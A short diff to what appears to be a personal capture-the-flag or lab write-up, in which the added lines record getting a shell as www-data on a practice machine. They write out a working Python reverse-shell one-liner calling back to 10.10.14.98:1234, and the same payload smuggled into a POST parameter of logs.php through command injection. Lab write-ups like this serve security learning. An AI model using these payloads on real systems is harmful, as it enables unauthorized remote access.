@@ -20,5 +20,8 @@ User 'clarkey' was successfully added.
 Inspecting contents of SITEBACKUP.ZIP, found vulnerable section where code code for reverse shell could be injected.
 ![[Pasted image 20210918113156.png]]
 ## Getting shell as www-data
+Getting shell as www-data by injecting python reverse shell `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.98",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` in POST request of http://10.10.11.104/logs.php like below
+`delim=comma;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.98",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
+![[Pasted image 20210918113810.png]]
 
 
